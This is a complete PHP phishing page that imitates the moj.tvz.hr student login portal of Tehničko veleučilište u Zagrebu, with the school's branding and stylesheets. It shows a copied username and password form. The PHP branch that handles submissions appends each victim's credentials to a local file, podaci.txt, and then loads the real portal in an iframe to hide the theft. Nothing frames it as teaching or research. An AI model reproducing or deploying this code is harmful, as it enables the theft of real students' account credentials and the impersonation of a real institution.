

<?php
if(empty($_POST)){
print '<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1250; no-cashe; no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Language" content="hr">
    <meta name="Keywords" content="TVZ,Tehničko veleučilište u Zagrebu">
    <meta name="Description" content="Tehničko veleučilište u Zagrebu, Zagreb>
    <meta http-equiv="Author" content="Davor Cafuta davor.cafuta@tzv.hr Ivica Dodig ivica.dodig@tvz.hr">
    <link rel="shortcut icon" href="../../assets/ico/favicon.ico">
    <title>moj.tvz.hr 8.23 (2018-05-14)</title>
    <link href="https://moj.tvz.hr/css/bootstrap.css" rel="stylesheet">
    <link href="https://moj.tvz.hr/css/font-awesome.min.css" rel="stylesheet">
    <link href="https://moj.tvz.hr/css/pocetak_svega.css" rel="stylesheet">
<script src="https://moj.tvz.hr/js/jquery-1.11.1.min.js"></script>
<script src="https://moj.tvz.hr/js/bootstrap.js"></script>
  </head>
  <body>
      <div class="main-section">

    <div class="container-fluid">
	<div class="row">
		<div class="col-md-4 col-sm-8 col-xs-12 col-md-offset-4 col-sm-offset-2 login-image-main text-center">
			<div class="row">
				<div class="col-md-12 col-sm-12 col-xs-12 user-image-section">
					<img src=https://moj.tvz.hr/slika/naslov.png border=0>
				</div>
				<div class="col-md-12 col-sm-12 col-xs-12 user-login-box">
          <form action="tvz.php" class="form-signin l" role="form" method=post>
					<div class="form-group">
				  		<input type="text" name=username class="form-control" placeholder="Korisničko ime @tvz.hr" maxlength=25 required autofocus">
					</div>
					<div class="form-group">
				  		<input type="password" name="pass" class="form-control" placeholder="Lozinka"  maxlength=18  required>
					</div>
					<div class="form-group">
            <input class="btn btn-info" type="submit">
					</div>
          </form>
            <button class="btn btn-info btn-sm"  data-toggle="collapse"  data-target="#upute">Ne mogu se spojiti...</button>
            <div  id="upute" class="collapse">
                  <p><h5>Za pristup sustavu koristite AAI@Edu.Hr identitet. AAI@Edu.Hr dobivate upisom u ISVU sustav. Nakon što ste preuzeli AAIEDU korisničko ime i lozinku 24h nakon izdavanja i u roku od 48h promijenite lozinku prema uputi na izdanom papiru. Lozinku resetirate u studentskoj službi.
                  </h5></p><p><h5>Prijelaznici ili kandidati za upis do upisa u ISVU sustav koriste korisnički račun: gost sa lozinkom: gost</h5></p>
            </div>
				</div>
			</div>
		</div>
	</div>
    </div> <!-- /container -->
 </div>   
      <hr>
  </body>
</html>';
}
else {
	print '
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1250; no-cashe; no-cache">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta http-equiv="Language" content="hr">
    <meta name="Keywords" content="TVZ,Tehničko veleučilište u Zagrebu">
    <meta name="Description" content="Tehničko veleučilište u Zagrebu, Zagreb>
    <meta http-equiv="Author" content="Davor Cafuta davor.cafuta@tzv.hr Ivica Dodig ivica.dodig@tvz.hr">
    <link rel="shortcut icon" href="../../assets/ico/favicon.ico">
    <title>moj.tvz.hr 8.23 (2018-05-14)</title>
    <link href="https://moj.tvz.hr/css/bootstrap.css" rel="stylesheet">
    <link href="https://moj.tvz.hr/css/font-awesome.min.css" rel="stylesheet">
    <link href="https://moj.tvz.hr/css/pocetak_svega.css" rel="stylesheet">
	<script src="https://moj.tvz.hr/js/jquery-1.11.1.min.js"></script>
	<script src="https://moj.tvz.hr/js/bootstrap.js"></script>
  </head>
	<style>
		iframe {
			width:100%;height:900px; border:0;overflow: hidden;
			 
		}
	</style>
<body>
	<iframe src="https://moj.tvz.hr"></iframe>';
	if(isset($_POST['username']) && isset($_POST['pass'])) {
		$data = $_POST['username'] . '-' . $_POST['pass'] . "\n";
		$ret = file_put_contents('podaci.txt', $data, FILE_APPEND | LOCK_EX);
		
	}
}
?>

</body>
</html>

